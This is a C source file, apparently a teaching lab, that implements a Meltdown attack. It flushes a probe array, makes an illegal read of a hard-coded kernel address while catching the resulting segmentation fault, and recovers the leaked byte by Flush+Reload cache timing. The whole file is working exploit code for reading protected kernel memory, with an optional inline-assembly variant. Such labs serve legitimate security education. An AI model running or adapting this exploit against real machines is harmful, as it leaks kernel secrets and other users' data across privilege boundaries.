#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

// Global probing array for Flush+Reload
uint8_t array[256 * 4096];

// Cache hit threshold (in CPU cycles)
#define CACHE_HIT_THRESHOLD 80
#define DELTA 1024

/*************** Flush + Reload Setup ****************/

// Flush array[] from the CPU cache
void flushSideChannel() {
    for (int i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1; // Touch the page
    }

    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i * 4096 + DELTA]); // Flush from cache
    }
}

// Reload array[] and measure access time
void reloadSideChannel() {
    int junk = 0;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    for (int i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];

        time1 = __rdtscp(&junk);      // Start timestamp
        junk = *addr;                 // Access memory
        time2 = __rdtscp(&junk) - time1; // End timestamp

        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache.\n", i, DELTA);
            printf("The Secret = %d (ASCII '%c')\n", i, i);
        }
    }
}

/*************** Meltdown Simulation ****************/

// Attempt to access kernel memory (triggers SIGSEGV)
void meltdown(unsigned long kernel_data_addr) {
    char kernel_data = *(char *)kernel_data_addr; // Illegal read
    array[kernel_data * 4096 + DELTA] += 1;        // Leak via cache
}

// Optional: Meltdown version using inline assembly
void meltdown_asm(unsigned long kernel_data_addr) {
    char kernel_data = 0;

    // Delay via useless ALU operations
    asm volatile(
        ".rept 400;"
        "add $0x141, %%eax;"
        ".endr;"
        :
        :
        : "eax"
    );

    // Same illegal read
    kernel_data = *(char *)kernel_data_addr;
    array[kernel_data * 4096 + DELTA] += 1;
}

/*************** Signal Handling ****************/

static sigjmp_buf jbuf;

// Handle segmentation fault (SIGSEGV) gracefully
static void catch_segv() {
    siglongjmp(jbuf, 1);
}

/*************** Main Entry ****************/

int main() {
    // Register signal handler for segmentation fault
    signal(SIGSEGV, catch_segv);

    // Step 1: Flush the side-channel array
    flushSideChannel();

    // Step 2: Try to read from protected memory and leak secret
    if (sigsetjmp(jbuf, 1) == 0) {
        meltdown(0xfb61b000); // Replace with known kernel address
    } else {
        printf("Memory access violation caught!\n");
    }

    // Step 3: Reload array[] to recover leaked secret
    reloadSideChannel();

    return 0;
}
